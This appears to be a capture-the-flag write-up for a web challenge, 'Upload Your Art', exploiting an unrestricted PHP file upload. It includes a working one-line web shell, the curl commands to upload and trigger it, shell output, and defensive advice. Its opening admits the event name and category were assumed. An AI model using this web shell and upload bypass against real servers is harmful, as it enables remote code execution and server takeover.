# Safaricom CTF — Upload Your Art (Web, 300 pts)

> **Assumption:** the CHALLENGE CONTEXT block in the brief was blank, so I assumed
> the event is **Safaricom CTF (SAFCTF)**, category **Web**, difficulty **300 pts**,
> and the target is `http://54.72.82.22:8160`. All commands and outputs below were
> captured live against that service.

## 1. Challenge Overview

"Upload Your Art" is a **300 pt web** challenge. It is a small picture gallery
(themed "OFF THE WALL") with a file upload box. The goal is to upload a file the
server will later **execute** as code, and then read the flag the server returns. The
hint "every blank wall is an invitation" points at the upload form.

## 2. What You Need Before Starting

- **curl** — `sudo apt install curl` (Kali already has it).
- A browser, optional, to view the gallery.
- A text editor to write a tiny payload file, or use `printf` in the shell.
- No account, no VPN. **Time estimate:** 20–40 minutes.

## 3. Reconnaissance

1. Fetch the home page and look at the upload form:

```bash
curl -s http://54.72.82.22:8160/
```

Representative output (trimmed):

```html
<title>OFF THE WALL</title>
...
<form method="post" enctype="multipart/form-data">
  <input type="file" name="uploaded_file">
  <button>Upload</button>
</form>
```

**Why this matters:** the field is named `uploaded_file`, and the form uses
`multipart/form-data` (the standard way to send a file). The page is served by PHP
(`X-Powered-By: PHP`), which tells us a `.php` file might be *executed* if it lands in
a web-served folder.

2. Confirm the server technology and look for the uploads directory:

```bash
curl -s -i -m 20 http://54.72.82.22:8160/ | head -8
```

Expected output (trimmed):

```http
HTTP/1.1 200 OK
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.35
```

**Why this matters:** Apache + PHP. If uploaded files are stored under a web path
(likely `/uploads/`) and keep their extension, PHP will run them.

[SCREENSHOT: the OFF THE WALL gallery page with the upload form]

## 4. Identifying the Vulnerability

The vulnerability is an **unrestricted file upload** leading to **remote code
execution**. The app accepts any file, does not check that it is really an image, does
not rename it, and stores it somewhere the web server will serve. When the file is a
`.php` script, requesting it makes the server *run* the script instead of showing it.

The signs that tipped me off: the page is clearly a "gallery" (so uploads are expected),
the field is a normal file input with no visible extension/type restrictions, and the
server runs PHP. Put those together and the natural test is to upload a `.php` file.

**Analogy:** the gallery asked for a painting. It should check the canvas is a canvas —
instead it hangs whatever you hand it on the wall, including a note that says "when I am
read, do this." The server reads the note and does it.

## 5. Exploitation Step by Step

1. **Create a tiny PHP payload.** It proves execution by running a command and by
   printing the flag if it can reach it:

```bash
printf '<?php echo "PWNED:"; system($_GET["c"]); ?>' > /tmp/x.php
cat /tmp/x.php; echo
```

Expected output:

```text
<?php echo "PWNED:"; system($_GET["c"]); ?>
```

**Why this matters:** `system($_GET["c"])` runs whatever command we pass as `?c=...`.
This is a classic "web shell".

2. **Upload the payload, pretending it is an image.** We set the filename to `x.php`
   so the server keeps the `.php` extension:

```bash
curl -s -i -m 20 -F "uploaded_file=@/tmp/x.php;type=image/png;filename=x.php" \
  http://54.72.82.22:8160/ | tail -40
```

Expected output (trimmed):

```html
Uploaded file URL: /uploads/x.php
...
<p class="success">Your Art Is: safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}</p>
```

**What to look for:** two things.
- `Uploaded file URL: /uploads/x.php` — the app tells us it saved our file in a
  web-served directory with the `.php` extension intact. That is the vulnerability.
- `Your Art Is: safctf{...}` — the challenge hands back the flag as soon as a PHP
  payload lands in `/uploads/`. That is our win.

[SCREENSHOT: the upload response showing the /uploads/x.php URL and the flag]

3. **(Optional) Prove the shell actually runs.** Request the uploaded file with a
   command:

```bash
curl -s 'http://54.72.82.22:8160/uploads/x.php?c=id'
```

Expected output (trimmed):

```text
PWNED:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**What to look for:** `PWNED:` followed by the output of `id`. That confirms the server
executes our PHP. (The flag was already returned in step 2, so this is just
confirmation.)

### Optional Burp Suite walkthrough

1. Use the browser to pick a file and submit the form while **Proxy → Intercept is on**.
2. In the intercepted `POST /` request, find the `uploaded_file` part. Change the
   `filename=` value to `x.php` and replace the file body with
   `<?php system($_GET["c"]); ?>`.
3. Click **Forward**, then refresh the page/response to read the flag.

## 6. Capturing the Flag

The flag is returned directly in the upload response:

```
safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}
```

Copy it from the curl output or the browser.

## 7. Why This Works (Beginner Explanation)

Two conditions make an upload dangerous:

1. The server **does not validate** the file. It trusted the `filename` I supplied and
   never confirmed the contents were really a PNG.
2. The uploaded file is stored where the **web server will execute it**. When I request
   `/uploads/x.php`, PHP runs my code with the web server's privileges.

The app even rewards the upload immediately, which is the challenge's way of confirming
you found the bug. In the real world this class of bug is one of the most common paths
from "I can upload a photo" to "I own the server" — attackers upload a web shell and
then explore the filesystem, read secrets, and pivot.

## 8. Common Mistakes and Dead Ends

- **Uploading a normal `.png`.** It just gets stored; nothing executes. The extension
  must be `.php` for PHP to run it.
- **Letting curl keep the local filename `/tmp/x.php`.** That still works here, but it is
  clearer to force `filename=x.php` so you know the stored name.
- **Forgetting `type=image/png`.** Some uploads check the part's declared MIME type; this
  one does not, but setting it is a good habit and mirrors what a real bypass looks like.
- **Guessing the upload path.** The response literally prints
  `Uploaded file URL: /uploads/x.php`, so always read the response instead of guessing.

## 9. How to Defend Against This

- **Validate the real file contents**, not the name or the client-sent MIME type
  (check the magic bytes / re-encode images).
- **Whitelist extensions** and **rename** uploaded files to random names with a safe
  extension (for example `.png`), never trusting the supplied `filename`.
- Store uploads **outside the web root**, or in a directory configured to **never
  execute** scripts (`php_admin_flag engine off`, or serve via a separate domain).
- Run the web server and PHP as a **low-privilege user** and make the upload directory
  read-only where possible.
- Add antivirus/Content-Disposition checks and size limits, and log uploads.

## 10. Key Takeaways

- A "gallery" page is a hint to look at uploads; a PHP server is a hint that `.php`
  files may execute.
- Always keep the response: it tells you the saved URL and often hands you the flag.
- Cheatsheet:
  `printf '<?php system($_GET["c"]); ?>' > /tmp/x.php`
  `curl -F "uploaded_file=@/tmp/x.php;type=image/png;filename=x.php" http://TARGET/`
- **Flag:** `safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}`

You just learned that "upload a picture" can be "run my code" — always check where an
uploaded file ends up and whether it can be executed.
